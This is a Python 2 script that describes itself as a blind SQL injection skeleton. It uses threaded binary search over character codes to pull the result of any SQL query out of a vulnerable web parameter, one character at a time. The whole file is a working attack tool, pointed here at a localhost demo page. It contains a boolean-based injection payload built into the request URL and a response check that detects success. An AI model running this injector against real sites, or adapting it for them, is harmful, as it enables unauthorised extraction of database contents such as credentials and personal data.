import threading
import requests
import argparse
import Queue

class Duncan(threading.Thread):
	def __init__(self,query='select version()',pos=1,q=None,ascii_begin=32,ascii_end=123,debug=0):
		"""Main constructor

		Keyword arguments:
        query -- Query to be executed
        pos -- Character position to test
        q -- Results Queue object
        ascii_begin -- Start of the ASCII range to test
        ascii_end -- End of the ASCII range to test
        """
		threading.Thread.__init__(self)
		self._query=query
		self._pos=pos
		self._min=ascii_begin
		self._max=ascii_end
		self._debug=debug

	def debug(self,level,msg):
		if level<=self._debug:
			print msg

	def run(self):
		while self._max-self._min>1:
			guess=self._min+(self._max-self._min)/2
			self.debug(5,"Max: %d Guess: %d Min: %d" % (self._max, guess, self._min))
			if self.decide(guess):
				self._max=guess-1
			else:
				self._min=guess
		if self.decide(self._max):
			self.debug(1,"Position %d: %c" % (self._pos,chr(self._min)))
			q.put((self._pos,chr(self._min)))
		else:
			self.debug(1,"Position %d: %c" % (self._pos,chr(self._max)))
			q.put((self._pos,chr(self._max)))


	def decide(self,guess):
		"""Here you should implement your injection code.

		Arguments:
		guess -- Guess

		Should return True if the actual ASCII value of a given position is less than guess
		""" 
		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
		self.debug(6,url)
		r=requests.get(url)
		
		if r.content.find(':)')>-1:
			return True
		else:
			return False

# From http://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python
def chunks(l, n):
    """ Yield successive n-sized chunks from l.
    """
    for i in xrange(0, len(l), n):
		yield l[i:i+n]

parser = argparse.ArgumentParser(description='Duncan - Blind SQL injector skeleton')
parser.add_argument("--query",required=True,help="The query to be run. Should contain only one attribute.")
parser.add_argument("--pos-start",default=1,type=int,help="First character position to look up")
parser.add_argument("--pos-end",default=5,type=int,help="Last character position to look up")
parser.add_argument("--ascii-start",default=32,type=int,help="Start of the ASCII range to test")
parser.add_argument("--ascii-end",default=123,type=int,help="End of the ASCII range to test")
parser.add_argument("--threads-per-position",default=1,type=int,help="Threads per position [EXPERIMENTAL]")
parser.add_argument("--debug",default=0,type=int,help="Debug - higher values for more verbosity")

args = parser.parse_args()
q=Queue.Queue()
threads=[]
for p in xrange(args.pos_start,args.pos_end):
	for chunk in chunks(range(args.ascii_start,args.ascii_end),(args.ascii_end-args.ascii_start+1)/args.threads_per_position):
		thread=Duncan(args.query,p,q,chunk[0],chunk[-1]+1,args.debug)
		threads.append(thread)
		thread.start()

for t in threads:
	t.join()

l=[]
while not q.empty():
	l.append(q.get())

print ''.join([i[1] for i in sorted(list(l))])
